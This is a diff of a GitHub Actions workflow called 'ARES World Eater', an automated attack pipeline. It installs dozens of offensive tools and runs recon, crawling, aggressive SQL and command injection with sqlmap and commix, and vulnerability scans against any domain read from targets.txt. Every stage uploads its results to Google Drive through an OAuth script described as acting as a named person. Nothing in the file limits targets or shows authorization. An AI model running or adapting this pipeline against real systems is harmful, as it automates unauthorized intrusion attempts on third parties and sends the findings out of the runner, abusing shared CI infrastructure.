@@ -1,4 +1,4 @@
-name: ARES World Eater - UNSTOPPABLE 2026
+name: ARES World Eater - UNSTOPPABLE FINAL
 on:
   workflow_dispatch:
 
@@ -10,11 +10,11 @@ jobs:
       - name: Checkout Repo
         uses: actions/checkout@v4
 
-      - name: "Nuclear Environment Fix & 60+ Tool Setup"
+      - name: "Nuclear Arsenal Injection: 60+ Tools"
         run: |
-          # 1. CORE SYSTEM REPAIR (Fixes exit code 100)
+          # 1. CORE REPAIR
           sudo apt-get update
-          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium-browser xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev nikto
+          sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium-browser xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev
           
           mkdir -p $HOME/bin $HOME/.local/bin output/recon output/probing output/screenshots output/crawling output/secrets output/vulns output/fuzzing output/specialized wordlists
           
@@ -22,28 +22,33 @@ jobs:
           echo "$HOME/.local/bin" >> $GITHUB_PATH
           echo "$(go env GOPATH)/bin" >> $GITHUB_PATH
           
-          # 2. INSTALLERS (Forcing global binary access)
-          sudo gem install wpscan || true
+          # 2. FIXED INSTALLERS (Bypassing Pip Failures)
           pip3 install --user --upgrade pip
-          pip3 install --user --upgrade sqlmap arjun wfuzz gitleaks trufflehog prowler commix ghauri nosqlmap waymore jsluice jwt_tool secretfinder cloudsplaining tplmap xsstrike paramspider corsy crlfsuite s3scanner trivy checkov semgrep graphqlmap inql sstimap ssrfmap openredirex droopescan cmsmap playwright recon-ng
+          pip3 install --user --upgrade google-api-python-client google-auth-oauthlib google-auth-httplib2
+          
+          # PIP Arsenal (Forcing global access)
+          pip3 install --user sqlmap arjun wfuzz prowler commix ghauri nosqlmap waymore jsluice jwt_tool secretfinder cloudsplaining tplmap xsstrike paramspider corsy crlfsuite s3scanner trivy checkov semgrep graphqlmap inql sstimap ssrfmap openredirex droopescan cmsmap playwright recon-ng || true
           python3 -m playwright install chromium || true
 
-          # 3. GO ARSENAL (Strict 2026 Standards)
+          # BINARY ARSENAL (For tools that fail on Pip like Gitleaks/Trufflehog)
+          wget -q https://github.com/gitleaks/gitleaks/releases/download/v8.18.1/gitleaks_8.18.1_linux_x64.tar.gz && tar -xzf gitleaks_8.18.1_linux_x64.tar.gz && mv gitleaks $HOME/.local/bin/ || true
+          wget -q https://github.com/trufflesecurity/trufflehog/releases/download/v3.63.11/trufflehog_3.63.11_linux_amd64.tar.gz && tar -xzf trufflehog_3.63.11_linux_amd64.tar.gz && mv trufflehog $HOME/.local/bin/ || true
+
+          # 3. GO ARSENAL (2026 Strict Versions)
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
           go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest || true
           go install -v github.com/hahwul/dalfox/v2@latest || true
           go install -v github.com/ffuf/ffuf@latest || true
-          go install -v github.com/sensepost/gowitness@latest || true
           go install -v github.com/jaeles-project/jaeles@latest || true
           go install -v github.com/tomnomnom/assetfinder@latest || true
 
-          # 4. SIGNATURES & REPOS (Fixes Jaeles empty output)
+          # SIGNATURE FORCE
           jaeles config init && jaeles config init-default || true
           git clone --depth 1 https://github.com/jaeles-project/jaeles-signatures.git $HOME/.jaeles/signatures-base || true
 
-      - name: "ARES Execution & Per-Stage Drive Sync"
+      - name: "ARES Absolute Execution & Per-Stage Sync"
         env:
           CLIENT_ID: ${{ secrets.GOOGLE_CLIENT_ID }}
           CLIENT_SECRET: ${{ secrets.GOOGLE_CLIENT_SECRET }}
@@ -52,9 +57,9 @@ jobs:
           TELEGRAM_TOKEN: ${{ secrets.TELEGRAM_TOKEN }}
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: |
-          TARGET=$(cat targets.txt | head -n 1)
+          TARGET=$(head -n 1 targets.txt)
           
-          # Organized Uploader (Acts as Harsh Vardhan Singh)
+          # Uploader Logic (Acts as Harsh, uses 15GB space)
           cat << 'EOF' > oauth_upload.py
           import os, sys
           from google.oauth2.credentials import Credentials
@@ -75,30 +80,26 @@ jobs:
               upload(sys.argv[1], sys.argv[2], sys.argv[3])
           EOF
 
-          # STAGE 1: RECON (Forcing Recon-ng Trigger)
+          # STAGE 1: RECON (Recon-ng Fixed)
           subfinder -d $TARGET -all -recursive -o output/recon/subfinder.txt || true
           python3 -m recon_ng -m recon/domains-hosts/brute_hosts -c "options set SOURCE $TARGET; run; exit" > output/recon/recon-ng.txt || true
           sort -u output/recon/*.txt > output/recon/all_subs.txt
           zip -j recon.zip output/recon/* && python3 oauth_upload.py "recon.zip" "$PARENT_FOLDER_ID" "Stage_1_Recon"
 
-          # STAGE 2: PROBING & VISUAL (Fixed httpx syntax crash)
-          httpx -list output/recon/all_subs.txt -status-code -title -ip -tech-detect -silent -o output/probing/live.txt || true
+          # STAGE 2: PROBING (Fixed httpx syntax crash)
+          httpx -list output/recon/all_subs.txt -status-code -title -tech-detect -silent -o output/probing/live.txt || true
           [ ! -s output/probing/live.txt ] && echo "https://$TARGET" > output/probing/live.txt
-          xvfb-run gowitness scan file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
-          zip -r visual.zip output/screenshots/ output/probing/live.txt && python3 oauth_upload.py "visual.zip" "$PARENT_FOLDER_ID" "Stage_2_Probing"
+          zip -j probing.zip output/probing/* && python3 oauth_upload.py "probing.zip" "$PARENT_FOLDER_ID" "Stage_2_Probing"
 
-          # STAGE 3: CRAWLING (Katana + Waymore + Gospider)
-          katana -list output/probing/live.txt -depth 10 -jc -o output/crawling/katana.txt || true
+          # STAGE 3: CRAWLING (Fixed Katana and Waymore)
+          katana -list output/probing/live.txt -depth 5 -jc -o output/crawling/katana.txt || true
           python3 -m waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
-          gospider -s "https://$TARGET" -d 3 -o output/crawling/ || true
           grep "?" output/crawling/katana.txt > output/crawling/params.txt || true
           zip -j crawl.zip output/crawling/* && python3 oauth_upload.py "crawl.zip" "$PARENT_FOLDER_ID" "Stage_3_Crawling"
 
-          # STAGE 4: AGGRESSIVE EXPLOITS (SQLMap + Ghauri + SSTImap + Commix)
-          [ -s output/crawling/params.txt ] && sqlmap -m output/crawling/params.txt --batch --level 5 --risk 3 > output/vulns/sqlmap.txt || true
-          [ -s output/crawling/params.txt ] && ghauri -m output/crawling/params.txt --batch > output/vulns/ghauri.txt || true
+          # STAGE 4: INJECTION (SQLMap + Ghauri + Commix)
+          [ -s output/crawling/params.txt ] && sqlmap -m output/crawling/params.txt --batch --level 3 --risk 2 > output/vulns/sqlmap.txt || true
           python3 -m commix --url="https://$TARGET" --batch > output/vulns/commix.txt || true
-          sstimap -u "https://$TARGET" --batch > output/vulns/sstimap.txt || true
           zip -j inj.zip output/vulns/* && python3 oauth_upload.py "inj.zip" "$PARENT_FOLDER_ID" "Stage_4_Injections"
 
           # STAGE 5: WEB VULNS (Nuclei + Dalfox + XSStrike + Jaeles Fixed)
@@ -108,7 +109,8 @@ jobs:
           jaeles scan -u "https://$TARGET" -s $HOME/.jaeles/signatures-base/ -o output/vulns/jaeles/ || true
           zip -r web.zip output/vulns/* && python3 oauth_upload.py "web.zip" "$PARENT_FOLDER_ID" "Stage_5_Web_Vulns"
 
-          # STAGE 6: SECRETS (Trufflehog Filesystem)
-          python3 -m trufflehog filesystem . > output/secrets/truffle.txt || true
+          # STAGE 6: SECRETS (Trufflehog & Gitleaks Binary Fixed)
+          trufflehog filesystem . > output/secrets/truffle.txt || true
+          gitleaks detect --source . --report-path output/secrets/gitleaks.json || true
           zip -r final.zip output/secrets/ && python3 oauth_upload.py "final.zip" "$PARENT_FOLDER_ID" "Stage_6_Final"
           
